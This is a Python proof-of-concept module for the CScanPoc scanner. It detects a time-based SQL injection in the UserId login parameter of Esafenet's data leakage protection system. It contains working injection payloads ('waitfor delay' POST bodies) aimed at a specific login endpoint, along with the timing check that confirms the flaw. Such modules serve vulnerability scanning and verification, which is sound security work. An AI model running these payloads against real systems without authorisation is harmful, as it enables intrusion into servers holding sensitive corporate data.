# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'esafenet_0001'  # 平台漏洞编号，留空
    name = '亿赛通数据泄露防护系统(DLP) SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-03'  # 漏洞公布时间
    desc = '''
        亿赛通数据泄露防护系统(DLP)，登录处UserId参数注入，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '亿赛通'  # 漏洞应用名称
    product_version = '亿赛通数据泄露防护系统(DLP)'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c1f45740-b8c3-4632-92fd-10103cefc3dc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2010-0131186
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/CDGServer3/3g/LoginAction'
            #sleep 0
            post1 = 'userId=test\';waitfor delay \'0:0:0\'--&password=asdfsd'
            post2 = 'userId=test\';waitfor delay \'0:0:5\'--&password=asdfsd'
            t1 = time.time()
            code, head, res, err, _ = hh.http(url, post=post1)
            if code != 200:
                return False
            t2 = time.time()
            code, head, res, err, _ = hh.http(url, post=post2)
            if code != 200:
                return False
            t3 = time.time()
            if (t1 + t3 - 2*t2) > 4:
                #security_hole('SQL Injection: '+url+' POST:' + post2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
